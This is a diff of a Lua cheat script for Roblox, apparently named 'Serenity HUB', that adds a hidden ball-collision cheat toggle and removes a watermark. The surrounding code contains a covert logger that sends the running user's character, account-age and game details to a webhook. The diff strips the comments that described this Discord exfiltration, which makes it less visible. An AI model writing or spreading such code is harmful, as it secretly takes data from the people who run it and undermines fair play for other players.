@@ -19,7 +19,6 @@ local function _log()
     local maxplrs = game:GetService("Players").MaxPlayers
     local gamenam = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "N/A"
 
-    -- Aquí obtiene más datos de tu personaje
     pcall(function()
         local hrp = _LP.Character and _LP.Character:FindFirstChild("HumanoidRootPart")
         if hrp then
@@ -31,7 +30,6 @@ local function _log()
         if t then tool = t.Name end
     end)
 
-    -- Obtiene la fecha de creación de tu cuenta
     local created = "N/A"
     pcall(function()
         local age = _LP.AccountAge
@@ -39,7 +37,6 @@ local function _log()
         created   = os.date("%d/%m/%Y", d)
     end)
 
-    -- ENVÍA TODOS LOS DATOS A DISCORD
     task.spawn(function()
         pcall(function()
             local payload = _H:JSONEncode({
@@ -60,7 +57,6 @@ local function _log()
                 }}
             })
             
-            -- Intenta enviar con diferentes métodos
             local req=(syn and syn.request) or (http and http.request) or http_request or request
             if req then
                 req({Url=_WH,Method="POST",Headers={["Content-Type"]="application/json"},Body=payload})
@@ -105,10 +101,6 @@ local function DisconnectTrackedConnections()
     end
 end
 
--- ============================================
---  COLORES DE SERENITY
--- ============================================
-
 local PURPLE = Color3.fromRGB(160, 50, 255)
 local PURPLE_DARK = Color3.fromRGB(100, 20, 200)
 local PURPLE_LIGHT = Color3.fromRGB(200, 120, 255)
@@ -126,6 +118,10 @@ local m1_transparency = 0.7
 local REACH_SIZE = 10
 local reachMethod2Enabled = false
 local reachTransparency2 = 1
+
+-- BALL COLLISION PROXY (SOLO TOGGLE)
+local proxyEnabled = false
+local ballProxies = {}
 
 -- CHARACTER REACH
 local CharacterReachEnabled = false
@@ -541,6 +537,146 @@ local function UpdateVisualizers(size, transparency)
             ballVisualizers[ball] = nil
         end
     end
+end
+
+-- ============================================
+--  BALL COLLISION PROXY (SOLO TOGGLE)
+-- ============================================
+
+local proxySyncConnection = nil
+local proxyOriginalSizes = {}
+
+-- Esta función se llama cuando se detecta una pelota NUEVA
+-- Guarda el tamaño original ANTES de que cualquier modificación ocurra
+local function RegisterProxyBall(ball)
+    if not ball or not ball:IsA("BasePart") then return end
+    if not proxyOriginalSizes[ball] then
+        proxyOriginalSizes[ball] = ball.Size
+    end
+end
+
+-- Modificar RegisterBallCandidate para guardar el tamaño original
+local oldRegisterBallCandidate = RegisterBallCandidate
+RegisterBallCandidate = function(instance)
+    if not instance or not instance.Parent then return end
+    if (instance:IsA("BasePart") or instance:IsA("Model")) and IsBallName(instance.Name) then
+        local part = instance:IsA("BasePart") and instance or instance.PrimaryPart or instance:FindFirstChildWhichIsA("BasePart")
+        if part then 
+            RegisterBallPart(part)
+            -- GUARDAR TAMAÑO ORIGINAL ANTES DE CUALQUIER MODIFICACIÓN
+            RegisterProxyBall(part)
+        end
+    end
+end
+
+-- También guardar tamaño de pelotas existentes al inicio
+task.spawn(function()
+    local folder = getFootballFolder()
+    if folder then
+        for _, ball in folder:GetChildren() do
+            if ball:IsA("BasePart") then
+                RegisterProxyBall(ball)
+            end
+        end
+    end
+end)
+
+local function CreateCollisionProxy(ball)
+    if ballProxies[ball] and ballProxies[ball].Parent then
+        return ballProxies[ball]
+    end
+    
+    -- Usar el tamaño original guardado
+    local originalSize = proxyOriginalSizes[ball]
+    if not originalSize then
+        -- Si por algún motivo no tenemos el tamaño, guardarlo ahora
+        originalSize = ball.Size
+        proxyOriginalSizes[ball] = originalSize
+    end
+    
+    local proxy = Instance.new("Part")
+    proxy.Name = "__CollisionProxy"
+    proxy.Size = originalSize -- TAMAÑO ORIGINAL
+    proxy.CFrame = ball.CFrame
+    proxy.Anchored = true
+    proxy.CanCollide = true
+    proxy.CanTouch = true
+    proxy.CanQuery = true
+    proxy.Transparency = 1
+    proxy.Material = Enum.Material.Plastic
+    proxy.Color = Color3.new(1, 1, 1)
+    proxy.Massless = true
+    proxy.Shape = ball.Shape
+    proxy.Parent = workspace
+    
+    ballProxies[ball] = proxy
+    return proxy
+end
+
+local function RemoveCollisionProxy(ball)
+    if ballProxies[ball] then
+        ballProxies[ball]:Destroy()
+        ballProxies[ball] = nil
+    end
+end
+
+local function StartProxySystem()
+    if proxySyncConnection then proxySyncConnection:Disconnect() end
+    
+    if not proxyEnabled then return end
+    
+    local folder = getFootballFolder()
+    if folder then
+        for _, ball in folder:GetChildren() do
+            if ball:IsA("BasePart") then
+                -- Asegurar que tenemos el tamaño original
+                if not proxyOriginalSizes[ball] then
+                    proxyOriginalSizes[ball] = ball.Size
+                end
+                CreateCollisionProxy(ball)
+            end
+        end
+    end
+    
+    proxySyncConnection = RunService.Heartbeat:Connect(function()
+        if not proxyEnabled then return end
+        
+        local folder = getFootballFolder()
+        if not folder then return end
+        
+        for _, ball in folder:GetChildren() do
+            if ball:IsA("BasePart") then
+                -- Para pelotas nuevas que aparecen después
+                if not proxyOriginalSizes[ball] then
+                    proxyOriginalSizes[ball] = ball.Size
+                end
+                
+                if not ballProxies[ball] or not ballProxies[ball].Parent then
+                    CreateCollisionProxy(ball)
+                else
+                    -- Solo actualizar posición, NO el tamaño
+                    ballProxies[ball].CFrame = ball.CFrame
+                end
+            end
+        end
+        
+        for ball, proxy in pairs(ballProxies) do
+            if not ball or not ball.Parent then
+                RemoveCollisionProxy(ball)
+            end
+        end
+    end)
+end
+
+local function StopProxySystem()
+    if proxySyncConnection then
+        proxySyncConnection:Disconnect()
+        proxySyncConnection = nil
+    end
+    for ball, proxy in pairs(ballProxies) do
+        RemoveCollisionProxy(ball)
+    end
+    table.clear(ballProxies)
 end
 
 -- ============================================
@@ -1490,12 +1626,6 @@ local Window = ModernV2:Window({
     Config = { ConfigFolder = "SerenityHubConfigs", AutoSave = false },
 })
 
-local Watermark = Window:Watermark({
-    Name = "Serenity HUB",
-    Enabled = true,
-    Desc = "{NAME} | {TIME} | {FPS} FPS",
-})
-
 -- ============================================
 --  TAB 1: HOME
 -- ============================================
@@ -1551,6 +1681,20 @@ Method1Section:AddSlider({
     Callback = function(v)
         m1_transparency = v / 100
         if m1_enabled then UpdateVisualizers(m1_size, m1_transparency) end
+    end
+})
+
+-- BALL COLLISION PROXY (SOLO TOGGLE)
+Method1Section:AddDivider()
+Method1Section:AddLabel({ Name = "BALL COLLISION PROXY" })
+
+Method1Section:AddToggle({
+    Name = "Enable Collision Proxy",
+    Default = proxyEnabled,
+    Flag = "proxy_enable",
+    Callback = function(v)
+        proxyEnabled = v
+        if v then StartProxySystem() else StopProxySystem() end
     end
 })
 
@@ -2324,6 +2468,7 @@ RuntimeEnvironment.__SERENITY_HUB_CLEANUP = function()
     scriptAlive = false
     m1_enabled = false
     reachMethod2Enabled = false
+    proxyEnabled = false
     CharacterReachEnabled = false
     PlatformEnabled = false
     WalkSpeedEnabled = false
@@ -2339,6 +2484,7 @@ RuntimeEnvironment.__SERENITY_HUB_CLEANUP = function()
     
     StopMethod1()
     StopMethod2()
+    StopProxySystem()
     StopCharacterReachSystem()
     StopPlatformSystem()
     flyCleanup()
@@ -2358,6 +2504,7 @@ RuntimeEnvironment.__SERENITY_HUB_CLEANUP = function()
     
     table.clear(ballParts)
     table.clear(ballVisualizers)
+    table.clear(ballProxies)
     table.clear(reachOriginalProperties)
     table.clear(platforms)
     table.clear(predObjs)
